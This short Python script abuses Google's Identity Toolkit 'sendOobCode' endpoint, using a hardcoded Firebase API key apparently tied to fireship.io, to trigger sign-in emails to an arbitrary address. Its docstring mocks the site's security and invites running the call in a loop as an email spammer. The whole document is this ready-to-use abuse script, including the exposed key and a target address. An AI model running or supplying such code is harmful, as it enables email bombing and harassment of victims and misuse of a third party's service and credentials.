import superfox as fox

"""
LOL! fireship.io security is so bad : ) You can use this code as email spammer. Use While .
"""

data = {
  "requestType": "EMAIL_SIGNIN",
  "email": "yotos67158@abudat.com",
  "continueUrl": "https://fireship.io/",
  "canHandleCodeInApp": True
}

url = 'https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=AIzaSyBns4UUCKIfb_3xOesTSezA9GbEyuIU7XA'
req = fox.post(url,payload=data)

print(req.ip)  